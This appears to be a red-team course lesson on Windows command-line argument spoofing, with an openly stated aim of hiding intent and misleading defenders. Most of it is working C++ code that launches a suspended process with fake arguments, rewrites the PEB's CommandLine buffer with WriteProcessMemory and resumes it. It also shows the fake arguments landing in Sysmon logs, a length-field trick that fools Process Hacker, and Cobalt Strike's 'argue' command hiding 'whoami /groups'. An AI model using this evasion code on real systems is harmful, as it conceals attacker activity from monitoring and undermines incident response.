Processes can be started with command line arguments.  For instance, if we do:

```
C:\>notepad C:\Windows\System32\WindowsCodecsRaw.txt
```

Notepad will launch and open the specified file.  Logging tools and process inspection tools can read these arguments, as they are stored in the Process Environment Block (PEB) of the process itself.
  

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/evasion/cmdline/notepad-default.png)


However, there are plenty of times where we may want to obscure our command line arguments to hide our true intent or mislead defenders.  This can be done using the following high-level steps:

-   Create a process with "fake" arguments (these are the arguments you want to get logged) in a suspended state.
-   Reach into the PEB and find the RTL_USER_PROCESS_PARAMETERS.
-   Overwrite the command line arguments in this structure with the actual arguments you want executed.
-   Resume the process.  When the process resumes, it executes the new arguments.

Create the target process with the fake arguments with the CREATE_SUSPENDED flag.

```c++
#include <iostream>
#include <Windows.h>

int main()
{
    // Create the process with fake args
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    WCHAR fakeArgs[] = L"notepad totally-fake-args.txt";

    if (CreateProcess(
        L"C:\\Windows\\System32\\notepad.exe",
        fakeArgs,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        L"C:\\",
        &si,
        &pi))
    {
        printf("Process created: %d", pi.dwProcessId);
    }
}
```

  

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/evasion/cmdline/fake-args.png)


Next, we need to use the native NtQueryInformationProcess API to query the process and populate a PROCESS_BASIC_INFORMATION struct.  One of the properties on this struct is the base address of the PEB.  For that, we need the **typedef** for the function.

```c++
#include <iostream>
#include <Windows.h>
#include <winternl.h>

typedef NTSTATUS(*QueryInformationProcess)(IN HANDLE, IN PROCESSINFOCLASS, OUT PVOID, IN ULONG, OUT PULONG);
```

  

Resolve the location of the API from ntdll.dll.

```c++
// Resolve the location of the API from ntdll.dll
HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
QueryInformationProcess NtQueryInformationProcess = (QueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
```

  

Then we can call it.

```
// Call NtQueryInformationProcess to read the PROCESS_BASIC_INFORMATION
PROCESS_BASIC_INFORMATION pbi;
DWORD length;

NtQueryInformationProcess(
    pi.hProcess,
    ProcessBasicInformation,
    &pbi,
    sizeof(pbi),
    &length);
```

  

Read the PEB using ReadProcessMemory.

```
// With the PEB base address, we can read the PEB structure itself
PEB peb;
SIZE_T bytesRead;

ReadProcessMemory(
    pi.hProcess,
    pbi.PebBaseAddress,
    &peb,
    sizeof(PEB),
    &bytesRead);
```
  

Now from the PEB, we have the location of the ProcessParameters.  Read those next.

```
// Read the Process Parameters
RTL_USER_PROCESS_PARAMETERS rtlParams;

ReadProcessMemory(
    pi.hProcess,
    peb.ProcessParameters,
    &rtlParams,
    sizeof(RTL_USER_PROCESS_PARAMETERS),
    &bytesRead);
```
  

Craft the new arguments and write them into the CommandLine buffer.

```
// Craft new args and write them into the command line buffer
WCHAR newArgs[] = L"notepad C:\\Windows\\System32\\WindowsCodecsRaw.txt";
SIZE_T bytesWritten;

WriteProcessMemory(
    pi.hProcess,
    rtlParams.CommandLine.Buffer,
    newArgs,
    sizeof(newArgs),
    &bytesWritten);
```

  

Finally, resume the process.

```
ResumeThread(pi.hThread);
```

  

Notepad will now open WindowsCodecsRaw.txt, but Sysmon has recoded the fake args.

```shell
Process Create:
ProcessId: 7056
Image: C:\Windows\System32\notepad.exe
CommandLine: notepad totally-fake-args.txt
CurrentDirectory: C:\
```

However, if we inspect it with Process Hacker, we see something rather curious.

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/evasion/cmdline/notepad-spoofed-partial.png)

It's the path to the real file and it's truncated.  So what's happening here?

First, Process Hacker provides point-in-time data.  It will re-read the PEB each time we close and re-open the properties window for a process.  So logically, it's now reading the new args we wrote into the PEB.

Second, the data within this buffer is actually a **UNICODE_STRING** which looks something like this:

```c++
struct UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
}
```

You can see that it has a Buffer (holds the actual data) and a Length (the length of the data).  When the process was created, the Length is **58** (_notepad totally-fake-args.txt_), but the new args (_notepad C:\\Windows\\System32\\WindowsCodecsRaw.txt_) has a length of **96**.  We are updating the content of the buffer, but not the length field; and if you read 58 bytes of the new args, it takes you as far as highlighted in bold: _**notepad C:\\Windows\\System32\\W**indowsCodecsRaw.txt_.

Process Hacker, Process Explorer and possibly others only read up to the value given by this field, so we can trick them by intentionally making it smaller, thus truncating the string at a strategic point (e.g. in this instance, what if it only showed "notepad" and not the path...).  _This is left as an exercise to the reader._

Command Line arg spoofing is controlled in Cobalt Strike with the `argue` command.

```shell
beacon> help argue
Use: argue [command] [fake arguments]
     argue [command]
     argue

Spoof [fake arguments] for [command] processes launched by Beacon.
This option does not affect runu/spawnu, runas/spawnas, or post-ex jobs.

Use argue [command] to disable this feature for the specified command.

Use argue by itself to list programs with defined spoofed arguments.
```

One thing to note about the implementation is that it also does not adjust the length field or allocate new memory, so the fake args should be as long, or longer than the real ones.

Let's start with a baseline:

```shell
beacon> shell whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes                                        
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544 Group used for deny only                          
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192  
```

  

Because the shell command was used here, Sysmon logs the creation of cmd.exe with the associated command line arguments.

```shell
Process Create:
ProcessId: 5096
Image: C:\Windows\System32\cmd.exe
CommandLine: C:\Windows\system32\cmd.exe /C whoami /groups
```

  

If we still wanted to run whoami via cmd, but without it appearing on the command line, we could do:

```shell
beacon> argue C:\Windows\system32\cmd.exe /c ping 127.0.0.1 -n 10
[*] Tasked beacon to spoof 'C:\Windows\system32\cmd.exe' as '/c ping 127.0.0.1 -n 10'

beacon> shell whoami /groups
```

We get the same output, but Sysmon logged it as:

```
Process Create:
ProcessId: 2588
Image: C:\Windows\System32\cmd.exe
CommandLine: C:\Windows\system32\cmd.exe /c ping 127.0.0.1 -n 10
```

Command Line spoofing is not a silver bullet, as in this case a process creation event for whoami.exe was still created.  The technique is much more effective when running commands that don't spawn additional processes.